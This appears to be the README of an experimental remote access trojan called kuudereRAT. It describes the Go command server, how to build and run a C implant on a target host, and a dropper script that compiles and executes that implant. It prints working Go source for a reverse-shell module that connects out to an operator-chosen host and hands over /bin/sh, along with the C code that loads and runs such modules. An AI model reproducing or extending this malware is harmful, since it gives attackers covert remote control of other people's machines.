# kuudereRAT
experimental modular RAT

# Usage 
in ```src/server``` directory edit main.go and select options for listener the default is set to listen on ```0.0.0.0:23855``` and the webserver to be started on ```8080```

# Functionality
Phones home to server repeatedly. Tasks are written as modules in Go and the implant will pick up and run a task if one is available. 

# Implant
Current fully functional implant is ```src/client/simplant/implant.c``` and it can be built with ```gcc -o implant implant.c -ldl```

The implant is run on the target host with ```./implant <ipaddr> <port>```

```desu.sh``` is a script that will copy the code to a file and then compile and execute the implant. 

Future versions will enable this script to be loaded remotely and executed from memory.

# Running
```go run main.go``` to startup the server and web interface.
Tasks are loaded through the web interface.

# Modules
Modules are written in Go and compiled to shared library (.so) for Linux hosts. This is a simple reverse shell module example. Function runModule() is exported and gets called by the implant starting a "go routine" for the shellStart() function. The implant is designed to create a function pointer to runModule() and any subsequent models should use this example format.

In this instance ```buildmodule.sh <ip> <port>``` is used to set the target host information at buildtime. 

```
package main

import (
	"C"
	"net"
	"os/exec"
)

var Host string

func shellStart() {
	conn, err := net.Dial("tcp", Host)
	if (err != nil) {
		return
	}
	cmd := exec.Command("/bin/sh")
	cmd.Stdin=conn
	cmd.Stdout=conn
	cmd.Stderr=conn
	cmd.Run()
}

//export runModule
func runModule() {
	go shellStart()
}

func main() {}
```

Code responsible for running modules on implant. Theoretically could run any program compiled to a shared library and with runModule() function exported.

```
void *handle;
const char* error_msg;
void (*execute)(void);

handle = dlopen(path, RTLD_LAZY);
if ( !handle ) {
    fprintf(stderr, "%s\n", dlerror());
    break; 
}
close(afd);
dlerror();
execute = dlsym(handle, "runModule");
error_msg = dlerror();
if ( error_msg ) {
    fprintf(stderr, "Error accessing function %s \n", error_msg);
    break;
}

(*execute)();
dlclose(handle);
```

# TODO
A lot lol. Main focuses are encryption, windows implant, and improving the web interface (module settings, implant generation, config options)